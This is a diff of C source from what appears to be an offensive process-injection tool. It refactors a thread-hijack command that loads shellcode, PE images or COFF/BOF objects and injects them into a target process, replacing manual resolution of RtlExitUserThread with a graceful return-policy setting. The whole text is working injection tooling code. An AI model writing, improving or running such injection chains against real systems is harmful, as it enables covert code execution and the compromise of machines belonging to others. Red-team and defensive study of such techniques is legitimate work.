@@ -106,15 +106,6 @@ int cmd_inject_hijack(int argc, char *argv[], const char *prog) {
 
     log_ok("%s backend active.", unified_backend_name(backend));
 
-    /* Return home: ntdll maps at the same base in the same-arch child. */
-    FARPROC exit_user_thread = NULL;
-    snd_ntdll_get_active_export(SND_HASH_RTLEXITUSERTHREAD, &exit_user_thread);
-    if (exit_user_thread) {
-        log_info("Return thunk: RtlExitUserThread @ 0x%p", (void *)exit_user_thread);
-    } else {
-        log_err("Could not resolve RtlExitUserThread; payloads that return will crash.");
-    }
-
     log_info("Loading payload: %s", file_path);
     st = unified_file_load(&be, file_path, &file_buf);
     if (SND_FAILED(st))
@@ -123,23 +114,24 @@ int cmd_inject_hijack(int argc, char *argv[], const char *prog) {
     inj.target_image_path = target_image_path;
     inj.proc_api          = be.proc_api;
     inj.thread_api        = be.thread_api;
+    inj.return_policy     = SND_INJ_RETURN_GRACEFUL;
 
     if (poc_strcmp(mode, "shell") == 0) {
         inj.payload = &file_buf;
         log_info("Firing thread-hijack shellcode chain...");
-        st = snd_inj_hijack_shell(&inj, (PVOID)exit_user_thread);
+        st = snd_inj_hijack_shell(&inj);
     } else if (poc_strcmp(mode, "pe") == 0) {
         ldr_pe.mem_api    = be.mem_api;
         ldr_pe.mod_api    = be.mod_api;
         ldr_pe.raw_source = &file_buf;
         log_info("Firing thread-hijack PE chain...");
-        st = snd_inj_hijack_pe(&ldr_pe, &inj, (PVOID)exit_user_thread);
+        st = snd_inj_hijack_pe(&ldr_pe, &inj);
     } else if (poc_strcmp(mode, "coff") == 0) {
         ldr_coff.mem_api    = be.mem_api;
         ldr_coff.mod_api    = be.mod_api;
         ldr_coff.raw_source = &file_buf;
         log_info("Firing thread-hijack COFF chain...");
-        st = snd_inj_hijack_coff(&ldr_coff, &inj, (PVOID)exit_user_thread, entry_name, bof_args, bof_arg_len);
+        st = snd_inj_hijack_coff(&ldr_coff, &inj, entry_name, bof_args, bof_arg_len);
     } else {
         log_err("Unknown mode: %s. Use shell, pe, or coff.", mode);
         st = SND_ERR(SND_STATUS_INVALID_COMMAND_LINE_ARG);
